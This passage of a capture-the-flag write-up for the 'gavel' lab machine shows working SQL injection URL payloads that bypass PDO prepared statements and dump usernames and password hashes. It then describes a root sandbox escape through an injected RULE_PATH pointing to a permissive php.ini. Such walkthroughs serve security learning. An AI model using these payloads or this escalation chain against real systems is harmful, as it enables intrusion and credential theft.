### <span style="color:lightgreen">SQL Injection</span>
Using the VS Code extension `Snyk Security` to scan for insecure code, I found a SQL injection vulnerability in `inventory.php` within the `$pdo` statement:

![Desktop View](assets/md_images/gavel-snyk.png){: .rounded-10 }

The following code block is responsible for the vulnerability:
```console

$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";
..snip..
    } else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
```

A Google search for `PDO SQL injection` led me to this [article](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/), which describes a novel exploitation technique. The vulnerable code pattern described in the article directly matches the logic found in `inventory.php`:
```console
<?php
$dsn = "mysql:host=127.0.0.1;dbname=demo";
$pdo = new PDO($dsn, 'root', '');

$col = '`' . str_replace('`', '``', $_GET['col']) . '`';
$stmt = $pdo->prepare("SELECT $col FROM fruit WHERE name = ?");
$stmt->execute([$_GET['name']]);

$data = $stmt->fetchAll(PDO::FETCH_ASSOC);
foreach($data as $v) {
	echo join(' : ', $v) . PHP_EOL;
}
```


According to the article, the original payload uses `#`(`%23`) as the comment terminator and includes a null byte (`%00`);

When adapting it for our use, we switched to `--+-` for commenting, encoded spaces as `+` and the single quote as `%27` to bypass the stricter input filtering on the target server.

```console
#article payload
http://localhost:8000/?name=x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23&col=\?%23%00

# adjust to stricter input filtering
http://gavel.htb/inventory.php?sort=\?;--+-&user_id=x`+FROM+(SELECT+table_name+AS+`%27x`+FROM+information_schema.tables)y;--+-
```

After enumerating the database schema, the `users` table immediately stood out as a high-value target for credential extraction:

![Desktop View](assets/md_images/gavel-sql1.png){: .w-75 .rounded-10 w='1212' h='668' }

I’ll create a payload to extract the column names. Since the initial payload returns all columns in the database, I need to add a `WHERE` clause to filter the results. However, I cannot use single quotes as they will be escaped. To bypass this, I’ll use hex-encoded strings: `0x676176656c` for 'gavel' and `0x7573657273` for 'users':

```console
# extract the column names
http://gavel.htb/inventory.php?sort=\?;--+-&user_id=x`+FROM+(SELECT+column_name+AS+`%27x`+FROM+information_schema.columns)y;--+-

# add a WHERE to filter the results
http://gavel.htb/inventory.php?sort=\?;--+-&user_id=x`+FROM+(SELECT+column_name+AS+`%27x`+FROM+information_schema.columns+WHERE+table_schema=0x676176656c+AND+table_name=0x7573657273)y;--+-
```

It works! It shows the columns: `id`, `password`, `username`, etc.
![Desktop View](assets/md_images/gavel-sql2.png){: .w-75 .rounded-10 w='1212' h='668' }

I’ll dump the `users` table by concatenating the `username` and password columns, separated by a colon (`0x3a`):
```console
http://gavel.htb/inventory.php?sort=\?;--+-&user_id=x`+FROM+(SELECT+concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-
```
It worked! The payload returned the username `auctioneer` along with its corresponding password hash:
![Desktop View](assets/md_images/gavel-sql3.png){: .w-75 .rounded-10 w='1212' h='668' }

### <span style="color:lightgreen">Reverse Engineering</span>

#### Analyzing the Client - gavel-util
Opening the `gavel-util` in `Ghidra`, we see a straightforward "Request-Response" pattern. The tool supports three commands: `submit`, `stats`, and `invoice`.

##### The Submission Flow
When a user runs `gavel submit <file>`, the client performs several safety checks:
1. It ensures the file is a "regular file" and not a symlink or directory.
2. It caps the file size at 10MB to prevent DoS.
3. It reads the file and wraps it in a JSON envelope.

##### The "Smoking Gun" in the Client
While auditing the JSON construction, I noticed a call to a function named `collect_env()`:

```console
{
  "op": "submit",
  "content_length": 1234,
  "env": { ... current_shell_environment ... }
}
```
The client literally scrapes your current shell's environment variables and ships them off to the root-owned daemon. This is a massive red flag.

#### Auditing the Daemon - gaveld
The daemon is much more complex. It forks a new process for every connection and uses `getsockopt(SO_PEERCRED)` to verify the user's identity.

##### The PHP Sandbox
When you submit a YAML file, it contains a `rule` field. This rule is executed inside a PHP sandbox to ensure it’s safe. The daemon uses a custom function, `php_safe_run()`, which initializes the PHP engine with a restrictive `php.ini` file located at `/opt/gavel/.config/php/php.ini`.


### <span style="color:lightgreen">Exploit Chain</span>
The vulnerability lies in how `gaveld` chooses its configuration file. Looking at the decompiled code for the sandbox initialization:

```console
// Searching for RULE_PATH in the JSON 'env' object sent by the client
res = json_object_object_get_ex(env_object, "RULE_PATH", &env_RULE_PATH_obj);
if (res != 0) {
    env_RULE_PATH_value = (char *)json_object_get_string(env_RULE_PATH_obj);
    if (access(env_RULE_PATH_value, R_OK) == 0) {
        // OVERRIDE: Use the path provided in the JSON instead of the default!
        strncpy(php.ini_path, env_RULE_PATH_value, 0x1000);
    }
}
```
The Attack Path:
1. Environment Poisoning: Since the client sends our local environment to the server, we can set an environment variable `RULE_PATH`locally.
2. Config Injection: We create a file at `/dev/shm/php.ini` that looks like a normal `php.ini` but has disable_functions= (empty).
3. Sandbox Escape: We run `gavel submit payload.yaml`. The client sends our `RULE_PATH` to the server. The server reads our "evil" config, loads the PHP engine without restrictions, and executes our `rule` code as root.
